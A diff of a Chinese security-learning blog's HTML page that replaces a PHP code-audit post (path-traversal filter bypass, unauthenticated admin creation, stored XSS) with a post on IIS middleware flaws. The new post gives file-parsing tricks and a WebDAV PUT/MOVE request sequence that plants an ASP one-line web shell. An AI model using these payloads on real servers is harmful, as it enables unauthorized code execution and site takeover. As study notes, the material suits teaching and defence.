@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="某汽车网源码的进一步代码审计, 个人blog,信息安全学习记录,生活,学习">
+    <meta name="keywords" content="中间件安全-IIS篇, 个人blog,信息安全学习记录,生活,学习">
     <meta name="description" content="信息安全学习记录">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>某汽车网源码的进一步代码审计 | EASY</title>
+    <title>中间件安全-IIS篇 | EASY</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/EASY233/picture/img/u=1849935945,3564713778&fm=26&gp=0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">某汽车网源码的进一步代码审计</h1>
+                    <h1 class="description center-align post-title">中间件安全-IIS篇</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                <span class="chip bg-color">代码审计</span>
+                            <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">中间件安全</span>
                             </a>
                         
                     </div>
@@ -447,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-02
+                    2020-08-05
                 </div>
                 
 
@@ -463,53 +463,42 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <blockquote>
-<p>文章首发于圈子社区:<a href="https://www.secquan.org/CodeAudit/1071106" target="_blank" rel="noopener">https://www.secquan.org/CodeAudit/1071106</a></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>IIS是一种Web（网页）服务组件，其中包bai括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
+<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-5-X-6-0文件解析漏洞"><a href="#IIS-5-X-6-0文件解析漏洞" class="headerlink" title="IIS 5.X/6.0文件解析漏洞"></a>IIS 5.X/6.0文件解析漏洞</h3><h4 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a>目录解析漏洞</h4><p>在网站下建立文件夹的名字为xx.asp,xx.asa的文件夹，其目录内的任何扩展名的文件都被 IIS 当作 asp 文件来解析并执行。用burp改上传路径为，upload/1.asp/1.jpg。</p>
+<h4 id="畸形文件解析漏洞"><a href="#畸形文件解析漏洞" class="headerlink" title="畸形文件解析漏洞"></a>畸形文件解析漏洞</h4><p>例如文件<strong>shell.asp;.jpg</strong> 在IIS 6.0中，这种畸形文件，分号 “;” 后边的内容不会被解析，所以最后执行的是shell.asp </p>
+<p>并且在IIS中默认可以执行的文件除了asp文件还有<strong>*.asa *.cer *.cdx</strong></p>
+<h3 id="IIS7-amp-IIS-7-5解析漏洞"><a href="#IIS7-amp-IIS-7-5解析漏洞" class="headerlink" title="IIS7&amp;IIS 7.5解析漏洞"></a>IIS7&amp;IIS 7.5解析漏洞</h3><p>该漏洞要在Fast-CGI运行模式下才会被触发，这个漏洞其实和nginx那个解析漏洞原理一样利用方式也是一样。在一个文件访问一个1.jpg文件。在访问的后面加上/xx.php就会解析成为php文件。</p>
+<h2 id="CVE-2017-7269-IIS6-0远程代码执行漏洞"><a href="#CVE-2017-7269-IIS6-0远程代码执行漏洞" class="headerlink" title="CVE-2017-7269 IIS6.0远程代码执行漏洞"></a>CVE-2017-7269 IIS6.0远程代码执行漏洞</h2><h2 id="IIS-PUT写漏洞"><a href="#IIS-PUT写漏洞" class="headerlink" title="IIS  PUT写漏洞"></a>IIS  PUT写漏洞</h2><blockquote>
+<p>影响版本：6.0、7.0、7.5，服务器开启了webdav的组件。</p>
 </blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间在先知社区看到一篇文章<a href="https://xz.aliyun.com/t/2730" target="_blank" rel="noopener">代码审计之某汽车网源码</a> 。作者介绍了两个sql注入漏洞，我在学习之余对该套代码进行进一步审计也发现了几个有趣的漏洞。</p>
-<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><pre class=" language-php"><code class="language-php">admin    <span class="token operator">--</span>后台文件夹
-cache    <span class="token operator">--</span>缓存文件夹
-<span class="token keyword">include</span>   <span class="token operator">--</span> 一些公共包含文件重点审核
-index     <span class="token operator">--</span> 前台注册登陆
-news      <span class="token operator">--</span> 新闻模块
-index<span class="token punctuation">.</span>php   <span class="token operator">--</span>网站入口
-qzqcw<span class="token punctuation">.</span>php   <span class="token operator">--</span>后台入口</code></pre>
-<h2 id="越权添加管理员"><a href="#越权添加管理员" class="headerlink" title="越权添加管理员"></a>越权添加管理员</h2><p>该漏洞是个几个小漏洞组合而成，待我一一分析。</p>
-<h3 id="前台有限制的任意文件包含漏洞"><a href="#前台有限制的任意文件包含漏洞" class="headerlink" title="前台有限制的任意文件包含漏洞"></a>前台有限制的任意文件包含漏洞</h3><p>该网站的功能都是直接通过include包含其他php使用的。在入口文件index.php中我们可以看到里面的包含规则：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'common.inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'index/page.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<p>测试我们服务器发送OPTIONS请求包:</p>
+<pre><code>OPTIONS / HTTP/1.1
 
-<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">'index'</span><span class="token punctuation">;</span>
+Host: www.test.com
+......
+......</code></pre><p>如果返回结果如下:</p>
+<pre><code>HTTP/1.1 200 OK
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+MS-Author-Via: DAV
+Content-Length: 0
+Accept-Ranges: none
+DASL: &lt;DAV:sql&gt;
+DAV: 1, 2
+Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+Cache-Control: private</code></pre><p>当ALLOW中包含如上方法时，可以确定服务器开启了WebDAV.</p>
+<p>这时候我们还不能直接上传可执行脚本，先使用PUT方法上传一个txt文件然后在使用MOVE方法进行修改,当然你得有写入权限：</p>
+<pre><code>PUT /test.txt HTTP/1.1
+Host: www.test.com
+Content-Length: 23
 
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'index/'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'error url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+&lt;%eval request(&quot;a&quot;)%&gt;</code></pre><p>在使用MOVE方法:</p>
+<pre><code>MOVE /test.txt HTTP/1.1
 
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'index/'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p>获取GET传来的$m参数拼接到文件路径中，如果文件存在就直接包含。当然这里也对$m参数也进行路径穿越的过滤，但是绕过并不是很难。<br>过滤代码在<code>include/function.func.php</code>22-32行之间，如下</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">_filter</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$value</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_filter</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span> 
-        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> 
-    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'..\\'</span><span class="token punctuation">,</span> <span class="token string">'../'</span><span class="token punctuation">,</span> <span class="token string">'./'</span><span class="token punctuation">,</span> <span class="token string">'.\\'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> </code></pre>
-<p>使用str_replace函数进行关键词过滤是非常不安全的，尤其是这种把关键词替换成空的情况。例如该函数把select关键词替换成空，我们只需改成selselectect即可。当函数把selelct替换成空前后合在一起就又成了我们所需要的select关键词。<br>这里的绕过同理，我测试的payload为:<code>.../...//....///</code>经过一轮替换后可以变成我们需要的<code>../</code>。<br>但是因为这里限定后缀只能是php所以在这里这个漏洞还是很鸡肋。</p>
-<h3 id="后台不安全的资源访问"><a href="#后台不安全的资源访问" class="headerlink" title="后台不安全的资源访问"></a>后台不安全的资源访问</h3><p>在admin文件夹下文件都会在开头加上这一行代码来防止普通用户来访问后文件资源</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">'APP_IN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'Access Denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p>如果APP_IN这个常量没有被定义就直接退出系统。但是该定义APP_IN这个常量的文件竟然在公共文件<code>common.inc.php</code>处。<br><img src="https://secquan.zzyuncheng.com/8e06ebb4354ea10d1cf7b83aab4818c4.png-quanzi" alt="file"><br>而这个文件正好也被前面所说的index.php包含着。所以思路就很明确在index.php处包含后台文件即可使用网站后台资源了。</p>
-<h3 id="添加管理员"><a href="#添加管理员" class="headerlink" title="添加管理员"></a>添加管理员</h3><p>我们利用该漏洞尝试在没有进行后台登陆的情况下添加管理员,效果如下图<br><img src="https://p4.ssl.qhimg.com/t01b9ca0aa7531aee83.png" alt="img"><br>然后我们查看是否添加成功：<br><img src="https://secquan.zzyuncheng.com/23d3785a38d44d9f9a877d97230d94a2.png-quanzi" alt="file"></p>
-<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>该站存在的xss其实并不少，这里挑选个利用相对简单的存储型xss聊聊</p>
-<p>漏洞在公司注册处：<a href="http://qzqcms.top/?m=register" target="_blank" rel="noopener">http://qzqcms.top/?m=register</a><br>漏洞代码在<code>index/register.php</code>处<br><img src="https://secquan.zzyuncheng.com/d15679ad40db979efc694973dc46f70e.png-quanzi" alt="file"><br>可以看到参数nicname和company没有进行任何的xss过滤操作就直接带入到了数据库。<br>这里利用的需要注意两点:</p>
-<ul>
-<li>1.数据库限制了nicncame参数的长度范围，所以真正好利用是公司名称company参数。</li>
-<li>2.这些参数都有前端的限制我们可以在burp中修改绕过限制。</li>
-</ul>
-<p><img src="https://secquan.zzyuncheng.com/d89e8a81f3874121371ccf9ce981d745.png-quanzi" alt="file"></p>
-<p>登陆后台查看，xss果然被触发：<br><img src="https://secquan.zzyuncheng.com/f27b987d13121fdb1d76394845960cb7.png-quanzi" alt="file"></p>
+Host: www.test.com
 
+Destination: http://www.test.com/test.asp</code></pre>
             </div>
             <hr/>
 
@@ -534,7 +523,7 @@ qzqcw<span class="token punctuation">.</span>php   <span class="token operator">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.easy233.top/2020/07/02/mou-qi-che-wang-yuan-ma-de-jin-yi-bu-dai-ma-shen-ji/">https://www.easy233.top/2020/07/02/mou-qi-che-wang-yuan-ma-de-jin-yi-bu-dai-ma-shen-ji/</a>
+                    <a href="https://www.easy233.top/2020/08/05/zhong-jian-jian-an-quan-iis-pian/">https://www.easy233.top/2020/08/05/zhong-jian-jian-an-quan-iis-pian/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -572,8 +561,8 @@ qzqcw<span class="token punctuation">.</span>php   <span class="token operator">
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                    <span class="chip bg-color">代码审计</span>
+                                <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">中间件安全</span>
                                 </a>
                             
                         </div>
@@ -745,25 +734,23 @@ qzqcw<span class="token punctuation">.</span>php   <span class="token operator">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/08/03/lfdcms/">
+                <a href="/2020/08/06/zhong-jian-jian-an-quan-jboss-pian/">
                     <div class="card-image">
                         
+                        <img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806111922.jpg" class="responsive-img" alt="中间件安全-jboss篇">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/medias/featureimages/23.jpg" class="responsive-img" alt="某cms代码审计">
-                        
-                        <span class="card-title">某cms代码审计</span>
+                        <span class="card-title">中间件安全-jboss篇</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言好久没有进行代码审计了，今天空闲选了一个较为简单的MVC架构的CMS进行练练手。源码下载地址版本为3.8.6。 该cms使用了THINKPHP3.2.3框架进行开发，并且没有修复其历史漏洞，这是其有多个漏洞的一个重要原因。
-前端多个sq
+                            前言JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-03
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-06
                         </span>
                         <span class="publish-author">
                             
@@ -776,8 +763,8 @@ qzqcw<span class="token punctuation">.</span>php   <span class="token operator">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">代码审计</span>
+                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">中间件安全</span>
                     </a>
                     
                 </div>
@@ -791,32 +778,29 @@ qzqcw<span class="token punctuation">.</span>php   <span class="token operator">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/06/24/hexo-jian-zhan-you-hua-guo-cheng-ji-lu/">
+                <a href="/2020/08/05/zhong-jian-jian-lou-dong-tomacat-pian/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/EASY233/picture/20200701093636.png" class="responsive-img" alt="New blog">
+                        <img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/u=2080030236,4239738931&fm=26&gp=0.jpg" class="responsive-img" alt="中间件安全-tomacat篇">
                         
-                        <span class="card-title">New blog</span>
+                        <span class="card-title">中间件安全-tomacat篇</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言我又又又换博客了，现在想想这是自已的第三个博客了。之前一直使用wordpress建立的博客，因为种种原因我选择放弃。hexo是我心中完美博客框架，纯静态的网页结构，在本地书写博客，一键上传github文章发布，甚至连自已的服务器与域名都
+                            前言Tomcat 是一个开源的轻量级Web 应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。
+实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-05
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/blog/" class="post-category">
-                                    blog
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            EASY
                             
                         </span>
                     </div>
@@ -824,8 +808,8 @@ qzqcw<span class="token punctuation">.</span>php   <span class="token operator">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/blog%E4%BC%98%E5%8C%96/">
-                        <span class="chip bg-color">blog优化</span>
+                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">中间件安全</span>
                     </a>
                     
                 </div>
